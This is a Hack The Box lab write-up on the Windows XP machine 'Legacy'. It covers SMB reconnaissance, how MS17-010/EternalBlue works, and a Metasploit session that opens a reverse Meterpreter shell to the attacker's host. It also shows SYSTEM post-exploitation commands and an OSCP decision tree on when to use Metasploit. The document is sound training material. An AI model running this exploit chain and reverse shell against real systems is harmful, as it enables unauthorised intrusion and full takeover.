# Legacy — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | 🪟 Windows XP |
| **Difficulty** | 🟢 Easy |
| **Owned** | 13/09/2026 |
| **Author** | Maksym S |

> ⚠️ Retired machine. Flags are redacted (`<redacted>`) in line with the HTB Terms of Service.

---

## 📌 Summary

**Legacy** is a Windows XP box exposing only SMB/RPC (135/139/445). The path to root is
**MS17-010 / EternalBlue (CVE-2017-0143)** against SMBv1, exploited with Metasploit's
`ms17_010_psexec` module for a SYSTEM-level Meterpreter session.

**Attack path:** `SMBv1 (dialect NT LM 0.12) → MS17-010 / EternalBlue → SYSTEM`

---

## 🔍 1. Reconnaissance

### TCP

```
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows XP SP2 or SP3 (96%), Microsoft Windows XP SP3 (96%), ...
Network Distance: 2 hops

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-09-18T17:58:08+03:00
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:b2:cd:0d (unknown)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5d00h27m32s, deviation: 2h07m16s, median: 4d22h57m32s
```

### UDP

```
2026/09/13 09:00:54 [+] Starting UDP scan on 1 target(s)
2026/09/13 09:00:54 [*] 10.129.227.181:137 (netbios)
2026/09/13 09:00:54 [*] 10.129.227.181:123 (ntp)
2026/09/13 09:00:58 [+] Scan completed
```

```
123/udp open  ntp        Microsoft NTP
| ntp-info:
|_  receive time stamp: 2026-09-18T15:02:01
137/udp open  netbios-ns Microsoft Windows netbios-ns (workgroup: HTB)
| nbns-interfaces:
|   hostname: LEGACY
|_    interfaces: 10.129.227.181
Service Info: Host: LEGACY; OS: Windows; CPE: cpe:/o:microsoft:windows
|_clock-skew: 5d01h57m44s
```

---

## ❌ What I did wrong (first pass)

After initial enumeration I **missed a clue**: `|_smb2-time: Protocol negotiation failed
(SMB2)`. This line means the host doesn't speak SMBv2 at all — a strong signal to check
which SMBv1 dialects it *does* support, and to run SMB vuln scripts specifically.

Follow-up scans that should have come immediately after noticing that line:

```bash
nmap --script "smb-protocols" -p 139,445 10.129.227.181
```

```
Host script results:
| smb-protocols:
|   dialects:
|_    NT LM 0.12 (SMBv1) [dangerous, but default]
```

```bash
nmap --script smb-vuln* -p445 10.129.227.181
```

```
Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
```

**Lesson:** a "protocol negotiation failed (SMB2)" line isn't noise — it's telling you the
host is SMBv1-only, and SMBv1-only + Windows = go straight to `smb-vuln*`.

---

## 🧭 2. Interesting information — MS17-010 / EternalBlue

**MS17-010** is a Microsoft security bulletin from March 2017 patching a critical remote
code execution vulnerability in the **SMBv1 server implementation** (`srv.sys`/`srv2.sys`
on Windows). **EternalBlue** is the specific exploit that weaponizes it — developed by the
NSA, leaked publicly by the Shadow Brokers group in April 2017.

**Root cause:** the bug lives in how `srv.sys` handles SMB1 `Transaction2` (TRANS2)
requests — specifically in the conversion routines `SrvOs2FeaListToNt` /
`SrvOs2FeaListSizeToNt`, which handle "Full Extended Attribute" (FEA) data structures, a
legacy OS/2-compatibility feature almost nobody actually used. There's a miscalculation
between the size these routines *compute* for a buffer and the size they later *use* when
copying data into it — an attacker can craft the FEA list so the copy overflows the
allocated kernel pool buffer. Since `srv.sys` runs in kernel mode, a successful overflow
gives **remote code execution with SYSTEM privileges** — the highest possible privilege on
the box, over the network, often without needing valid credentials at all (many EternalBlue
variants trigger the corruption during session setup / early transaction handling, before
deeper authorization checks like `NetShareEnum` even come into play).

**Why it mattered so much:** two months after the patch, EternalBlue became the propagation
engine for:
- **WannaCry** (May 2017) — ransomware that self-spread as a worm across unpatched SMB1
  hosts, hitting the UK's NHS, Spain's Telefónica, and hundreds of thousands of machines in
  ~150 countries in days.
- **NotPetya** (June 2017) — nominally ransomware but functionally a destructive wiper,
  which used EternalBlue (plus a credential-theft technique) to cripple Maersk, Merck, and
  other large organizations, causing billions in damage.

Both worms specifically targeted **SMBv1** — which is exactly why Microsoft moved to
disable SMBv1 by default starting with Windows 10/Server 2016, and why Samba/modern Windows
now require you to explicitly re-enable it (as had to be done to build a test target for
this project at all).

---

## 🎯 3. Exploitation

```
use exploit/windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_psexec) > set RHOST 10.129.227.181
RHOST => 10.129.227.181
msf exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.15.121
LHOST => 10.10.15.121
msf exploit(windows/smb/ms17_010_psexec) > run
[*] Started reverse TCP handler on 10.10.15.121:4444
[*] 10.129.227.181:445 - Target OS: Windows 5.1
[*] 10.129.227.181:445 - Filling barrel with fish... done
[*] 10.129.227.181:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.129.227.181:445 -        [*] Preparing dynamite...
[*] 10.129.227.181:445 -                [*] Trying stick 1 (x86)...Boom!
[*] 10.129.227.181:445 -        [+] Successfully Leaked Transaction!
[*] 10.129.227.181:445 -        [+] Successfully caught Fish-in-a-barrel
[*] 10.129.227.181:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.129.227.181:445 - Reading from CONNECTION struct at: 0x864cf990
[*] 10.129.227.181:445 - Built a write-what-where primitive...
[+] 10.129.227.181:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.227.181:445 - Selecting native target
[*] 10.129.227.181:445 - Uploading payload... sZUIWavG.exe
[*] 10.129.227.181:445 - Created \sZUIWavG.exe...
[+] 10.129.227.181:445 - Service started successfully...
[*] 10.129.227.181:445 - Deleting \sZUIWavG.exe...
[*] Sending stage (203452 bytes) to 10.129.227.181
[*] Meterpreter session 1 opened (10.10.15.121:4444 -> 10.129.227.181:1048) at 2026-09-13 13:37:37 -0400
```

**Post-exploitation:**

```
meterpreter > ls
Listing: C:\WINDOWS\system32
...

C:\>net user administrator /active:yes
The command completed successfully.

C:\>cd "Documents and Settings"
C:\Documents and Settings>dir
 Directory of C:\Documents and Settings
16/03/2017  09:07      <DIR>          Administrator
16/03/2017  08:29      <DIR>          All Users
16/03/2017  08:33      <DIR>          john

C:\Documents and Settings\Administrator\Desktop>type root.txt
<redacted>

C:\Documents and Settings\john\Desktop>type user.txt
<redacted>
```

---

## 🚩 Proof

```
user.txt (john):          <redacted>
root.txt (Administrator): <redacted>
```

---

## 🧐 Interesting side quest — hand-rolled SMBv1 enumeration

Before jumping to Metasploit, I built [**smb-enum-legacy**](tools/smb-enum-legacy/) — a
from-scratch Python SMBv1 (CIFS) client implementing `NEGOTIATE → SESSION_SETUP_ANDX (null
session) → TREE_CONNECT_ANDX (IPC$) → RAP NetShareEnum`, hand-packing every wire structure
against the `[MS-CIFS]`/`[MS-SMB]` specs instead of using `impacket`'s higher-level helpers.

**Verdict: a good exercise for understanding SMBv1 internals, but a rabbit hole for
actually pwning this box.** Legacy's foothold is MS17-010 — a kernel pool-corruption bug in
`srv.sys`'s TRANS2 handling — which has nothing to do with RAP `NetShareEnum` or share
listing at the application layer. Writing this tool taught real protocol internals (the
`[MS-CIFS]` header, AndX chaining, RAP's `\PIPE\LANMAN` transaction format) but it doesn't
move the needle on root. Time-box exploratory tooling like this, and recognize when it has
stopped being an entry-path candidate and become a separate learning project.

The code is vendored in [`tools/smb-enum-legacy/`](tools/smb-enum-legacy/) for reference.

---

## 🧠 Lessons Learned

- **Don't skip past negotiation-failure lines.** `smb2-time: Protocol negotiation failed
  (SMB2)` was the earliest signal that this host is SMBv1-only — and SMBv1-only Windows
  hosts should immediately get `nmap --script smb-vuln*`.
- **MS17-010/EternalBlue is a kernel memory-corruption bug** — a different class from
  logic flaws/misconfigs, and one of the clearest cases where reaching for Metasploit is
  the right call rather than hand-rolling a kernel exploit (see the decision tree below).
- **Building your own protocol client is valuable — separately from pwning the box.**
  `smb-enum-legacy` was worth writing for the learning, but it was a rabbit hole relative
  to the actual foothold on Legacy. Recognize the difference between "practicing a skill"
  and "working the box in front of you."

---

## 🌳 Decision tree — use Metasploit or go manual? (OSCP)

A framework for deciding, box by box, whether spending an OSCP exam's limited Metasploit
allowance is justified — worked out while triaging Legacy/MS17-010.

```
1. Is there a plausible *manual* initial-access path on this box that isn't this CVE?
   (misconfigured web app, weak creds, exposed service, simple misconfig)
   ├─ YES → do that instead. Don't spend msf on a box that has an intended
   │         non-msf route — msf here is a shortcut around real point-scoring,
   │         and OSCP boxes are generally designed with one.
   └─ NO, this CVE looks like the only realistic foothold → continue

2. What class of bug is it?
   ├─ Logic flaw / auth bypass / simple misconfig / injection
   │    → Manual, always. Cheap to hand-craft or adapt a small script,
   │      and it's exactly the skill the exam is testing.
   └─ Memory corruption (kernel or heap RCE, e.g. EternalBlue-class)
        → continue, lean toward msf-eligible

3. Does a well-maintained, easy-to-adapt standalone PoC actually exist for
   this bug (not "exists somewhere on GitHub" but "runs with reasonable
   effort against your target's OS/build")?
   ├─ YES → try manual first, budget a hard time limit (e.g. 30-45 min).
   │         If it works, you kept your msf token in reserve.
   └─ NO / only fragile, outdated, dependency-hell ports exist
        → strong candidate for spending msf here

4. Is the target OS/build one the public non-msf ports are known to
   handle poorly (old/EOL OS, XP/2003-era, oddball builds), vs. one
   they were actually built and tested against (7/2008R2/2012)?
   ├─ Poorly-supported OS → reinforces "spend msf here"
   └─ Well-supported OS → manual is more likely to just work, less reason to burn the token

5. Sunk cost check: have you already burned significant time on manual
   attempts and hit real (not surface-level) blockers — broken deps,
   wrong offsets, crashes — rather than just "haven't tried yet"?
   ├─ YES → cut losses, use msf. Exam time lost chasing a fragile kernel
   │         exploit's tooling doesn't buy you anything once you've
   │         confirmed the manual path is genuinely rough, not just untried.
   └─ NO, haven't seriously tried → try manual first per step 3's time-box

6. Opportunity cost: does staying stuck on this box block you from
   reaching other machines / other point-scoring paths?
   ├─ YES, it's gating progress elsewhere → spend msf, move on
   └─ NO, isolated box → more room to justify spending extra manual time
        before resorting to msf, since the cost of being stuck is lower
```

### Marking Legacy/MS17-010 against this tree

- **Step 1**: No simpler manual initial-access path exists on this box — 445/135/139 only,
  XP, no web app, no other service surface. → continue.
- **Step 2**: Kernel pool-corruption RCE (memory corruption). → lean msf-eligible.
- **Step 3**: The standalone Python ports of EternalBlue are Python 2, dependency-fragile,
  and not clean/easy to adapt quickly. → fails the "reasonable effort" bar.
- **Step 4**: Target is Windows XP — the OS the standalone community ports are *least*
  well-tuned for (most engineering went into 7/2008R2/2012 targets). → reinforces spending
  msf.
- **Step 5**: Real time was already spent chasing this manually and hit genuine friction
  (not just "hadn't looked yet"). → cut losses.
- **Step 6**: Depends on exam context, but if this is a single-target box rather than a
  pivot point, urgency is lower — still fine to spend the token if manual attempts keep
  stalling.

**Verdict: yes, this box is a good fit for using the Metasploit allowance.** It hits every
signal the tree is built around — memory-corruption bug class, poorly-supported target OS
in the manual tooling, no alternate foothold, and real (not hypothetical) friction already
encountered. This is exactly the kind of box the "one free use" exists for, rather than one
to save it for.

---

## 🔗 References

- [CVE-2017-0143 — MS17-010 SMBv1 RCE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
- [MS17-010 Security Bulletin](https://technet.microsoft.com/en-us/library/security/ms17-010.aspx)
- [CVE-2008-4250 — MS08-067](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250)
- [Customer Guidance for WannaCrypt Attacks](https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/)
